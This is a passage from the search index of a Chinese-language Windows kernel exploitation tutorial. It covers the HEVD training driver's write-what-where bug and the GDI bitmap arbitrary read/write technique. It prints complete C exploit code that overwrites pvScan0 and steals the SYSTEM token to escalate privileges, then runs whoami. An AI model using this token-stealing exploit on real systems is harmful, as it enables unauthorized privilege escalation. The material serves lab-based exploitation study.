\u540e\u9762\u7684\u6307\u4ee4\u90fd\u6ca1\u6709\u5f97\u5230\u6267\u884c\u3002","title":"0x02 HEVD Write-What-Where \u6f0f\u6d1e\u5229\u7528"},{"location":"HEVD/arbitraryWrite/#0x03","text":"\u5927\u5bb6\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u81ea\u5df1\u7f16\u5199 exp\u3002\u56e0\u4e3a\u5c31\u7b97\u4f60\u8111\u5b50\u61c2\u4e86\u771f\u6b63\u5199 exp \u4e5f\u53ef\u80fd\u5230\u5904\u51fa\u95ee\u9898\uff0c\u6240\u4ee5\u591a\u5199\u5199 exp \u53ef\u4ee5\u719f\u7ec3\u6211\u4eec\u7f16\u5199 exp \u7684\u80fd\u529b\u3002(\u5c0f\u58f0bb) \u8fd9\u6b21\u7528 c \u5199\u8fd9\u4e2a exp \u5c31\u662f\u8111\u5b50\uff1a\u61c2\u4e86\uff0c\u7f16\u8bd1\u5668\uff1aerror 99999 : ) 2019.9.1","title":"0x03 \u7ed3\u675f\u8bed"},{"location":"HEVD/bitmap/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u8fd8\u8bb0\u5f97\u7b2c\u4e8c\u7bc7\u4efb\u610f\u5730\u5740\u8986\u76d6\u4e2d\u6211\u4eec\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u4fee\u6539\u4e86 [HalDispatchTable+0x4] \u6765\u8fbe\u5230\u6267\u884c\u6211\u4eec shellcode \u7684\u76ee\u7684\u5417\uff1f\u4f46\u662f\u6211\u4eec\u6bd5\u7adf\u4fee\u6539\u4e86 Hal \u7684\u5206\u53d1\u8868\uff0c\u4e00\u4e2a\u6700\u5e95\u5c42\u7684\u5206\u53d1\u8868\uff0c\u867d\u7136\u90a3\u6bb5\u7a0b\u5e8f\u6267\u884c\u8d77\u6765\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u6307\u4e0d\u5b9a\u4ec0\u4e48\u65f6\u5019\u5c31\u4f7f\u7cfb\u7edf\u5d29\u6e83\u4e86\uff0c\u8fd9\u662f\u4e00\u4e2a\u9690\u60a3\u3002\u867d\u7136\u6211\u5f53\u65f6\u4e5f\u6709\u8fd9\u4e48\u60f3\u8fc7\uff0c\u4f46\u76f4\u63a5\u7528\u8fd9\u4e2a\u4e1c\u897f\u5f88\u5c11\u88ab\u8c03\u7528\u628a\u81ea\u5df1\u8bf4\u670d\u4e86 : ) \u76f4\u5230\u6709\u4eba\u95ee\u6211\u5047\u82e5\u6211\u4eec\u6709\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\uff0c\u5c31\u50cf\u7b2c\u4e8c\u7bc7\u6587\u7ae0\u90a3\u6837\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u4ec0\u4e48\u66f4\u7a33\u5b9a\u7684\u65b9\u6cd5\u5462\uff1f \u5728\u6b64\u5148\u611f\u8c22\u4e00\u4e0b @wjllz \u7684\u5e2e\u52a9 0x01 bitmap \u662f\u4ec0\u4e48 \u6211\u4eec\u5148\u770b\u770b\u5b98\u65b9\u6587\u6863 \u8fd9\u4e00\u770b\u5c31\u662f\u4e2a\u8ddf gdi \u6709\u5173\u7684\u7ed8\u56fe\u7684\u4e1c\u897f\uff0c\u8fd9\u663e\u7136\u4e0d\u662f\u6211\u4eec\u611f\u5174\u8da3\u7684\uff0c\u4f46\u4e0d\u6025\uff0c\u9996\u5148\u6211\u4eec\u770b\u770b CreateBitmap \u4f1a\u521b\u5efa\u4e00\u4e2a\u4ec0\u4e48\u6837\u7684\u7ed3\u6784\u3002 (\u8fd9\u5f20\u56fe\u4e0d\u662f\u6211\u753b\u7684\uff0c\u4e0d\u8fc7\u8fd9\u5f20\u56fe\u5728\u7f51\u4e0a\u4f20\u5f97\u633a\u5e7f\u7684\uff0c\u6240\u6709\u7684\u56fe\u7247\u5e94\u8be5\u662f\u51fa\u81ea\u540c\u4e00\u4e2a\u4eba\uff0c\u53ea\u4e0d\u8fc7\u6211\u4e0d\u77e5\u9053\u662f\u8c01\uff0c\u4e0b\u9762\u770b\u8d77\u6765\u660e\u663e\u662f\u540c\u4e00\u4e2a\u753b\u98ce\u7684\u90a3\u5f20\u56fe\u5e94\u8be5\u4e5f\u662f\u8fd9\u4e2a\u4eba\u753b\u7684) \u8bf4\u767d\u4e86\u5176\u5b9e\u5c31\u662f\u521b\u5efa\u4e86\u4e24\u4e2a\u7ed3\u6784\uff0c\u4e00\u4e2a\u53eb BASEOBJECT\uff0c\u6bcf\u4e00\u4e2a GDI \u5bf9\u8c61\u90fd\u6709\u7684\u4e00\u4e2a\u5934\u90e8\u3002\u53e6\u4e00\u4e2a\u53eb SURFOBJ\uff0c\u4fdd\u5b58\u4e86\u5305\u62ec\u6211\u4eec\u53c2\u6570\u4fe1\u606f\u7684\u5b9e\u9645\u7ed3\u6784\u3002 \u6211\u4eec\u5148\u770b\u770b BASEOBJECT \u8fd9\u4e2a\u5bf9\u8c61\u5728\u8fd9\u91cc\u5176\u5b9e\u6ca1\u4ec0\u4e48\u7528\uff0c\u6211\u4eec\u53ea\u8981\u8bb0\u4f4f\u5b83\u7684\u504f\u79fb\u5c31\u597d\u4e86 x86 : 0x10 x64 : 0x18 \u518d\u6765\u770b\u770b SURFOBJ \u5176\u5b83\u53c2\u6570\u90fd\u4e0d\u91cd\u8981\uff0c\u6211\u4eec\u770b\u5230 pvScan0 \u7ed3\u5408\u4e0a\u9762\u90a3\u5f20\u56fe\uff0cpvScan0 \u6307\u5411\u4e00\u5757 Pixel Data \u6570\u636e\u533a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 GetBitmapBits \u548c SetBitmapBits \u6765\u63a7\u5236\u90a3\u5757\u6570\u636e\u533a\u3002 GetbitmapBits: SetbitmapBits: 0x02 bitmap \u7684\u4f5c\u7528 \u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5e94\u8be5\u5df2\u7ecf\u5927\u81f4\u6e05\u695a\u4e86 CreateBitmap \u6240\u521b\u5efa\u7684\u5185\u6838\u5bf9\u8c61\u5927\u81f4\u662f\u4e00\u4e2a\u4ec0\u4e48\u6837\u7684\u7ed3\u6784\u4e86\uff0c\u90a3\u4e48\uff0c\u8fd9\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u6211\u4eec\u6240\u8bf4\u7684\u4f5c\u7528\u5f53\u7136\u4e0d\u662f\u5b83\u672c\u6765\u4e0e gdi \u76f8\u5173\u7684\u4f5c\u7528\uff0c\u800c\u662f\u5bf9\u6211\u4eec\u7684\u6f0f\u6d1e\u5229\u7528\u6709\u4ec0\u4e48\u5e2e\u52a9\u5462\uff1f \u4e0a\u9762\u8bf4\u5230\uff0cpvScan0 \u6307\u5411\u4e00\u5757 Pixel Data \u6570\u636e\u533a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 GetBitmapBits \u548c SetBitmapBits \u6765\u63a7\u5236\u90a3\u5757\u6570\u636e\u533a\u3002\u4e0d\u8fc7\uff0c\u6ce8\u610f\u5230 SURFOBJ \u662f\u4e00\u4e2a\u5904\u4e8e\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e0b\u7684\u5bf9\u8c61\uff0cpvScan0 \u6240\u6307\u5411\u7684 Pixel Data \u6570\u636e\u533a\u4e5f\u662f\u4f4d\u4e8e\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e0b\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u901a\u8fc7 GetBitmapBits \u548c SetBitmapBits \u6765\u63a7\u5236\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u6570\u636e\u4e86\uff0c\u53ea\u8981\u6211\u4eec\u6709\u529e\u6cd5\u63a7\u5236 pvScan0 \u7684\u503c\uff0c\u8fd9\u4e0d\u5c31\u662f\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u6f0f\u6d1e\u5417\uff1f \u90a3\u4e48\u6211\u4eec\u8be5\u600e\u4e48\u63a7\u5236 pvScan0 \u7684\u503c\u5462\uff1f\u5176\u5b9e pvScan0 \u548c CreateBitmap \u7684\u7b2c\u4e94\u4e2a\u53c2\u6570\u662f\u76f8\u5bf9\u5e94\u7684\uff0c\u6211\u4eec\u770b\u770b\u7b2c\u4e94\u4e2a\u53c2\u6570\u548c pvScan0 \u600e\u4e48\u8bf4 \u8fd9\u91cc\u6839\u636e\u6211\u7684\u8c03\u8bd5\u7ed3\u679c\uff0c\u5982\u679c\u6211\u4eec\u7ed9 CreateBitmap \u7684\u7b2c\u4e94\u4e2a\u53c2\u6570\u968f\u4fbf\u6307\u5b9a\u4e00\u4e2a\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u7684\u8bdd\uff0c\u6548\u679c\u7c7b\u4f3c\u8fd9\u6837\u7684\u4ee3\u7801 HBITMAP hManager = CreateBitmap(0x20, 0x20, 0x1, 0x8, (PDWORD32)WorkerpvScan0Address); \u90a3\u4e48 hManager \u4f1a\u76f4\u63a5\u4e3a NULL,\u4e5f\u5c31\u662f\u8bf4\u521b\u5efa\u5931\u8d25\u4e86\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u6211\u4eec\u6ca1\u529e\u6cd5\u968f\u610f\u63a7\u5236 pvScan0 \u7684\u503c\uff0c\u9876\u591a\u53ea\u80fd\u8ba9 pvScan0 \u6307\u5411\u4e00\u5757\u6709\u610f\u4e49\u7684\u533a\u57df\u3002 \u6240\u4ee5\u6211\u4eec\u5176\u5b9e\u662f\u9700\u8981\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u6765\u63a7\u5236 pvScan0 \u7684\u503c\u7684\uff08\u63a7\u5236 pvScan0 \u7684\u503c\u4e4b\u540e\u6211\u4eec\u8fd8\u80fd\u83b7\u5f97\u4efb\u610f\u5730\u5740\u8bfb\u6743\u9650\uff09 \u603b\u7ed3\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u80fd\u901a\u8fc7 bitmap \u6765\u83b7\u5f97\u4efb\u610f\u5730\u5740\u8bfb\u5199\u6743\u9650\uff0c\u8fd9\u5c31\u662f bitmap \u7684\u4f5c\u7528 0x03 \u5982\u4f55\u4f7f\u7528 bitmap \u90a3\u4e48\uff0c\u5047\u82e5\u6211\u4eec\u6709\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u7684\u8bdd\uff0c\u6211\u4eec\u8be5\u5f80\u54ea\u91cc\u5199\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684\u533a\u57df\u7684\u5730\u5740\u5462\uff1f\u6362\u53e5\u8bdd\u8bf4\uff0c\u600e\u4e48\u83b7\u5f97 pvScan0 \u7684\u5730\u5740\uff1f \u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053 fs \u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u6307\u5411 teb\uff0c\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u6307\u5411 pcr\uff0c\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 NtCurrentTeb \u6765\u83b7\u5f97 teb \u7684\u57fa\u5740\u3002teb \u4e2d\u7684 ProcessEnvironmentBlock \u6307\u5411\u7ebf\u7a0b\u6240\u5728\u7684\u8fdb\u7a0b peb\u3002peb \u504f\u79fb 0x094 \u7684\u5730\u65b9\uff08x86\u4e0b\uff09\u662f\u4e00\u4e2a\u6307\u5411 GDICELL \u7ed3\u6784\u4f53\u6570\u7ec4\u7684\u6307\u9488 GdiSharedHandleTableAddr \u901a\u8fc7 CreateBitmap \u8fd4\u56de\u7684 handle \u503c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8be5 bitmap \u7684 GDICELL \u7ed3\u6784\u4f53\u7684\u7d22\u5f15\uff0c\u8ba1\u7b97\u65b9\u6cd5\u4e3a DWORD32 pKernelAddress = GdiSharedHandleTableAddr + (( DWORD32 ) handle 0xffff ) * ( x86 : 0x10 , x64 : 0x18 ); \u6ca1\u9519\uff0c\u901a\u8fc7 GdiSharedHandleTableAddr \u6307\u9488\u6211\u4eec\u5c31\u80fd\u627e\u5230 pvScan0 \u7684\u5730\u5740\uff0c\u4f46\u662f\u5728 windows 10 1607 \u53ca\u5176\u4ee5\u540e\u7684\u7248\u672c\uff0cGdiSharedHandleTableAddr \u6307\u9488\u6307\u5411\u7684\u533a\u57df\u53d8\u4e3a\u4e86 ????\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a\u672a\u5206\u914d\u7684\u533a\u57df\uff0c\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u8fd9\u4e2a\u5229\u7528\u65b9\u6cd5\u88ab\u6253\u4e0a\u4e86\u8865\u4e01\uff0c\u56e0\u4e3a\u6211\u4eec\u6ca1\u6cd5\u5f97\u5230 pvScan0 \u7684\u5730\u5740\u4e86\u3002 \u56de\u5230\u539f\u6587\uff0cGDICELL \u7ed3\u6784\u4f53\u7684\u7ed3\u6784\u4e3a /// 32bit size: 0x10 /// 64bit size: 0x18 typedef struct _GDI_CELL { IntPtr pKernelAddress ; UInt16 wProcessId ; UInt16 wCount ; UInt16 wUpper ; UInt16 wType ; IntPtr pUserAddress ; } \u5176\u7b2c\u4e00\u4e2a\u6307\u9488 pKernelAddress \u6307\u5411\u4e86 BASEOBJECT \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u4e5f\u5c31\u662f\u8bf4 *(PDWORD32)pKernelAddress + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38) \u6b63\u662f pvScan0 \u7684\u5730\u5740 0x04 bitmap \u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u5229\u7528 \u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u5176\u5b9e bitmap \u7684\u5229\u7528\u5df2\u7ecf\u5f88\u6e05\u6670\u4e86 \u8c03\u7528 CreateBitmap \u521b\u5efa bitmap \u5185\u6838\u5bf9\u8c61 \u901a\u8fc7 teb \u83b7\u5f97 pvScan0 \u7684\u5730\u5740 \u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u6539\u5199 pvScan0 \u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u8bfb\u7684\u5730\u5740 \u8c03\u7528 GetBitmapBits \u6765\u8bfb\u53d6\u6570\u636e \u63a5\u4e0b\u6765\u5c31\u4ee5\u7b2c\u4e8c\u7bc7\u6587\u7ae0\u7684\u6f0f\u6d1e\u6765\u63d0\u6743\u9a8c\u8bc1\u4e00\u4e0b bitmap \u7684\u4f7f\u7528 \u5728\u5f00\u59cb\u4e4b\u524d\uff0c\u5148\u770b\u4e00\u4e0b\u8fd9\u5f20\u56fe \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u4e24\u4e2a bitmap\uff0c\u4e00\u4e2a\u7528\u6765\u63a7\u5236\u6211\u4eec\u8981\u8bfb\u5199\u7684\u5730\u5740\uff0c\u4e00\u4e2a\u7528\u6765\u5b9e\u9645\u5bf9\u90a3\u5757\u5730\u5740\u8fdb\u884c\u8bfb\u5199\uff0c\u8fd9\u6837\u5b50\u64cd\u4f5c\u8d77\u6765\u4f1a\u8212\u670d\u5f88\u591a\uff0c\u5199\u8d77\u4ee3\u7801\u6765\u4e5f\u66f4\u6e05\u6670\u7b80\u6d01\u3002 \u7531\u4e8e\u6211\u4eec\u4e4b\u540e\u4e0d\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u6267\u884c\u6211\u4eec\u7684 shellcode\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u6a21\u62df\u8fd9\u4e2a\u8fc7\u7a0b\uff08\u6211\u4eec\u53ef\u4ee5\u5bf9\u4efb\u610f\u5730\u5740\u8fdb\u884c\u8bfb\u5199\uff09 \u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5e94\u8be5\u8981\u505a\u7684\u4e8b \u521b\u5efa\u4e24\u4e2a bitmap\uff0c\u5206\u522b\u4e3a hManager \u548c hWorker \u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u6539\u5199 hManager \u7684 pvScan0 \u7684\u503c\u4e3a hWorker \u7684 pvScan0 \u7684\u5730\u5740 \u7ed3\u5408 GetBitmapBits \u548c SetBitmapBits\uff0c\u5229\u7528 hManager \u548c hWorker \u8bfb\u53d6 system \u7684 token \u628a system \u7684 token \u8d4b\u4e88\u6211\u4eec\u7684\u5f53\u524d\u8fdb\u7a0b \u9a8c\u8bc1\u63d0\u6743 \u8fd9\u91cc\u8865\u5145\u4e00\u4e0b\u4e24\u4e2a\u5c0f\u77e5\u8bc6 \u7b2c\u4e00\u4e2a\u662f ntoskrnl.exe \u4e2d\u6709\u4e2a\u53eb PsInitialSystemProcess \u7684\u5168\u5c40\u53d8\u91cf\uff08\u6307\u9488\uff09\uff0c\u5176\u6307\u5411 system \u8fdb\u7a0b\u7684 eprocess \u7b2c\u4e8c\u4e2a\u662f\u5185\u6838\u5728\u4e0d\u540c\u7684\u73af\u5883\u4e0b\u6709\u4e0d\u540c\u7684\u540d\u5b57 \u5230\u73b0\u5728\u5e94\u8be5\u628a\u6bcf\u4e00\u4e2a\u70b9\u90fd\u8bf4\u6e05\u695a\u4e86\uff0c\u63a5\u4e0b\u6765\u8d34\u51fa\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u7684 bitmap \u5229\u7528\u65b9\u6cd5 \uff08\u4e4b\u524d\u662f\u6539\u5199 [HalDispatchTable+0x4] \u6765\u6267\u884c shellcode\uff09 #include stdafx.h #include windows.h #include Psapi.h TCHAR driverName [ 1024 ]; typedef struct _payload { PULONG_PTR what ; PULONG_PTR where ; } Payload , * PPayload ; VOID readOOB ( HBITMAP hManager , HBITMAP hWorker , DWORD32 whereWrite , LPVOID whatWrite , int len ) { SetBitmapBits ( hManager , len , whereWrite ); // set \u5199\u7684\u662f hWorker \u7684 pvScan0 \u7684\u503c // \u901a\u8fc7\u63a7\u5236 hWorker \u7684 pvScan0 \u7684\u503c\u6765\u51b3\u5b9a\u5bf9\u54ea\u5757\u5730\u5740\u8fdb\u884c\u8bfb\u5199 GetBitmapBits ( hWorker , len , whatWrite ); } VOID writeOOB ( HBITMAP hManager , HBITMAP hWorker , DWORD32 whereWrite , LPVOID whatWrite , int len ) { SetBitmapBits ( hManager , len , whereWrite ); SetBitmapBits ( hWorker , len , whatWrite ); } DWORD32 getpvScan0Address ( HBITMAP handle ) { printf ( handle value: 0x%p \\n ,( DWORD32 ) handle ); DWORD32 tebAddr = ( DWORD32 ) NtCurrentTeb (); printf ( tebAddr: 0x%p \\n , tebAddr ); DWORD32 pebAddr = * ( PDWORD32 )(( PUCHAR ) tebAddr + 0x30 ); printf ( pebAddr: 0x%p \\n , pebAddr ); DWORD32 GdiSharedHandleTableAddr = * ( PDWORD32 )(( PUCHAR ) pebAddr + 0x94 ); printf ( GdiSharedHandleTableAddr: 0x%p \\n , GdiSharedHandleTableAddr ); // GdiSharedHandleTableAddr \u662f\u4e00\u4e2a\u6307\u5411GDICELL\u7ed3\u6784\u4f53\u6570\u7ec4\u7684\u6307\u9488 // GDICELL \u7ed3\u6784\u4f53 x86 0x10,x64 0x18 DWORD32 pKernelAddress = GdiSharedHandleTableAddr + (( DWORD32 ) handle 0xffff ) * 0x10 ; printf ( pKernelAddress: 0x%p \\n , pKernelAddress ); DWORD32 surfaceObject = * ( PDWORD32 ) pKernelAddress ; printf ( surfaceObject address: 0x%p \\n , surfaceObject ); // BASEOBJECT \u7ed3\u6784\u4f53 x86 0x10,x64 0x18 // pvScan0 \u5728 SURFOBJ \u7ed3\u6784\u4f53\u4e2d\u7684\u504f\u79fb x86 0x20,x64 0x38 DWORD32 pvScan0Address = surfaceObject + 0x10 + 0x20 ; printf ( pvScan0 address: 0x%p \\n , pvScan0Address ); return pvScan0Address ; } DWORD32 getKernelBase () { PVOID driversAddress [ 1024 ]; DWORD cbNeeded ; int cDrivers , i ; int ntoskrnlKernelBase ; // find ntoskrnl.exe kernel base if ( EnumDeviceDrivers ( driversAddress , sizeof ( driversAddress ), cbNeeded ) cbNeeded sizeof ( driversAddress )) { cDrivers = cbNeeded / sizeof ( driversAddress [ 0 ]); for ( i = 0 ; i cDrivers ; i ++ ) { if ( GetDeviceDriverBaseName ( driversAddress [ i ], driverName , 1024 )) { char * lowerName = _strlwr ( driverName ); if ( ! strncmp ( driverName , nt , 2 )) { ntoskrnlKernelBase = i ; break ; } else { if ( i == ( cDrivers - 1 )) { printf ( can t find driver name \\n ); exit ( 0 ); } continue ; } } else { printf ( get device driver name failed \\n ); } } } else { printf ( Enumerate Device Drivers failed \\n ); return 0 ; } printf ( driver name is: %s \\n , driverName ); return ( DWORD32 ) driversAddress [ ntoskrnlKernelBase ]; } DWORD32 getSystemEProcessAddr () { DWORD32 ntoskrnlKernelBase = getKernelBase (); DWORD32 ntoskrnlUserBase = ( DWORD32 ) LoadLibrary ( driverName ); if ( ntoskrnlUserBase == NULL ) { printf ( load library failed! \\n ); return 0 ; } DWORD32 PsInitialSystemProcessUserSpaceAddr = ( DWORD32 ) GetProcAddress (( HMODULE ) ntoskrnlUserBase , PsInitialSystemProcess ); DWORD32 PsInitialSystemProcessKernelSpaceAddr = ntoskrnlKernelBase + ( PsInitialSystemProcessUserSpaceAddr - ntoskrnlUserBase ); return PsInitialSystemProcessKernelSpaceAddr ; } int main () { HBITMAP hManager = CreateBitmap ( 0x20 , 0x20 , 0x1 , 0x8 , NULL ); if ( hManager == NULL ) { printf ( create manager bitmap failed \\n ); return 0 ; } HBITMAP hWorker = CreateBitmap ( 0x20 , 0x20 , 0x1 , 0x8 , NULL ); if ( hWorker == NULL ) { printf ( create worker bitmap failed \\n ); return 0 ; } printf ( Manager bitmap: \\n ); DWORD32 ManagerpvScan0Address = getpvScan0Address ( hManager ); printf ( Worker bitmap: \\n ); DWORD32 WorkerpvScan0Address = getpvScan0Address ( hWorker ); PPayload payload = NULL ; // malloc payload = ( PPayload ) HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY , sizeof ( Payload )); payload - what = ( PULONG_PTR ) WorkerpvScan0Address ; payload - where = ( PULONG_PTR ) ManagerpvScan0Address ; DWORD BytesReturned = 0 ; HANDLE hDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DeviceIoControl ( hDevice , 0x0022200B , ( LPVOID ) payload , sizeof ( Payload ), NULL , 0 , BytesReturned , NULL ); // \u5df2\u7ecf overwrite \u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5229\u7528 SetBitmapBits \u548c GetBitmapBits \u6765\u8bfb\u5199 DWORD32 systemEprocessAddr = 0 ; LPVOID lpSystemToken = NULL ; // \u83b7\u53d6 system \u8fdb\u7a0b\u7684 token readOOB ( hManager , hWorker , getSystemEProcessAddr (), systemEprocessAddr , sizeof ( DWORD32 )); readOOB ( hManager , hWorker , ( systemEprocessAddr + 0x0f8 ), lpSystemToken , sizeof ( DWORD32 )); // _eprocess + 0x0f8 \u662f token // _eprocess + 0x0B8 \u662f ActiveProcessLinks.Flink // _eprocess + 0x0b4 \u662f processid // \u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684 _eprocess DWORD32 lpNextEPROCESS = 0 ; LPVOID lpCurrentPID = NULL ; DWORD32 dwCurrentPID ; LIST_ENTRY lpNextEntryAddreess = { 0 }; DWORD32 currentProcessID = GetCurrentProcessId (); // \u901a\u8fc7PID\u5224\u65ad\u662f\u5426\u83b7\u53d6\u5230\u5f53\u524d\u8fdb\u7a0b\u7684\u5730\u5740 readOOB ( hManager , hWorker , systemEprocessAddr + 0x0B8 , lpNextEntryAddreess , sizeof ( LIST_ENTRY )); do // \u6839\u636ePID\u662f\u5426\u627e\u5230\u5f53\u524d\u8fdb\u7a0b { // \u83b7\u53d6\u4e0b\u4e00\u4e2a\u8fdb\u7a0b lpNextEPROCESS = ( DWORD32 )(( PUCHAR ) lpNextEntryAddreess . Flink - 0x0B8 ); // \u83b7\u53d6PID readOOB ( hManager , hWorker , lpNextEPROCESS + 0x0b4 , lpCurrentPID , sizeof ( LPVOID )); dwCurrentPID = LOWORD ( lpCurrentPID ); readOOB ( hManager , hWorker , lpNextEPROCESS + 0x0B8 , lpNextEntryAddreess , sizeof ( LIST_ENTRY )); } while ( dwCurrentPID != currentProcessID ); DWORD32 currentTokenAddress = ( DWORD32 ) lpNextEPROCESS + 0x0f8 ; writeOOB ( hManager , hWorker , currentTokenAddress , lpSystemToken , sizeof ( LPVOID )); system ( whoami \\n ); } 0x05 \u7ed3\u675f\u8bed \u4e0a\u6587\u4e2d\u63d0\u5230\u8fc7\uff0cbitmap \u7684\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u4ece RS1 \u5f00\u59cb\u5c31\u5931\u53bb\u4f5c\u7528\u4e86\u3002\u7136\u800c\uff0c\u5931\u53bb\u4f5c\u7528\u540e\u53c8\u4ea7\u751f\u4e86 bitmap \u7684\u66ff\u4ee3\u65b9\u6cd5\uff0c\u63a5\u4e0b\u6765\u6253\u7b97\u5b66\u4e60\u4e00\u4e0b\u8fd9\u4e2a\u66ff\u4ee3\u65b9\u6cd5\u7684\u9012\u8fdb\u8fc7\u7a0b\uff08RS1 \u4e0b\u6709\u65b0\u7684\u5229\u7528\u65b9\u6cd5\uff0cRS2 \u4e0b\u53c8\u5931\u6548\u4e86\uff0cRS2 \u4e0b\u53c8\u53ef\u4ee5\u7528\u65b0\u7684\u65b9\u6cd5 ...\uff09 2019.9.11","title":"bitmap \u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u5229\u7528"},{"location":"HEVD/bitmap/#0x00","text":"\u8fd8\u8bb0\u5f97\u7b2c\u4e8c\u7bc7\u4efb\u610f\u5730\u5740\u8986\u76d6\u4e2d\u6211\u4eec\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u4fee\u6539\u4e86 [HalDispatchTable+0x4] \u6765\u8fbe\u5230\u6267\u884c\u6211\u4eec shellcode \u7684\u76ee\u7684\u5417\uff1f\u4f46\u662f\u6211\u4eec\u6bd5\u7adf\u4fee\u6539\u4e86 Hal \u7684\u5206\u53d1\u8868\uff0c\u4e00\u4e2a\u6700\u5e95\u5c42\u7684\u5206\u53d1\u8868\uff0c\u867d\u7136\u90a3\u6bb5\u7a0b\u5e8f\u6267\u884c\u8d77\u6765\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u6307\u4e0d\u5b9a\u4ec0\u4e48\u65f6\u5019\u5c31\u4f7f\u7cfb\u7edf\u5d29\u6e83\u4e86\uff0c\u8fd9\u662f\u4e00\u4e2a\u9690\u60a3\u3002\u867d\u7136\u6211\u5f53\u65f6\u4e5f\u6709\u8fd9\u4e48\u60f3\u8fc7\uff0c\u4f46\u76f4\u63a5\u7528\u8fd9\u4e2a\u4e1c\u897f\u5f88\u5c11\u88ab\u8c03\u7528\u628a\u81ea\u5df1\u8bf4\u670d\u4e86 : ) \u76f4\u5230\u6709\u4eba\u95ee\u6211\u5047\u82e5\u6211\u4eec\u6709\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\uff0c\u5c31\u50cf\u7b2c\u4e8c\u7bc7\u6587\u7ae0\u90a3\u6837\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u4ec0\u4e48\u66f4\u7a33\u5b9a\u7684\u65b9\u6cd5\u5462\uff1f \u5728\u6b64\u5148\u611f\u8c22\u4e00\u4e0b @wjllz \u7684\u5e2e\u52a9","title":"0x00 \u524d\u8a00"},{"location":"HEVD/bitmap/#0x01-bitmap","text":"\u6211\u4eec\u5148\u770b\u770b\u5b98\u65b9\u6587\u6863 \u8fd9\u4e00\u770b\u5c31\u662f\u4e2a\u8ddf gdi \u6709\u5173\u7684\u7ed8\u56fe\u7684\u4e1c\u897f\uff0c\u8fd9\u663e\u7136\u4e0d\u662f\u6211\u4eec\u611f\u5174\u8da3\u7684\uff0c\u4f46\u4e0d\u6025\uff0c\u9996\u5148\u6211\u4eec\u770b\u770b CreateBitmap \u4f1a\u521b\u5efa\u4e00\u4e2a\u4ec0\u4e48\u6837\u7684\u7ed3\u6784\u3002 (\u8fd9\u5f20\u56fe\u4e0d\u662f\u6211\u753b\u7684\uff0c\u4e0d\u8fc7\u8fd9\u5f20\u56fe\u5728\u7f51\u4e0a\u4f20\u5f97\u633a\u5e7f\u7684\uff0c\u6240\u6709\u7684\u56fe\u7247\u5e94\u8be5\u662f\u51fa\u81ea\u540c\u4e00\u4e2a\u4eba\uff0c\u53ea\u4e0d\u8fc7\u6211\u4e0d\u77e5\u9053\u662f\u8c01\uff0c\u4e0b\u9762\u770b\u8d77\u6765\u660e\u663e\u662f\u540c\u4e00\u4e2a\u753b\u98ce\u7684\u90a3\u5f20\u56fe\u5e94\u8be5\u4e5f\u662f\u8fd9\u4e2a\u4eba\u753b\u7684) 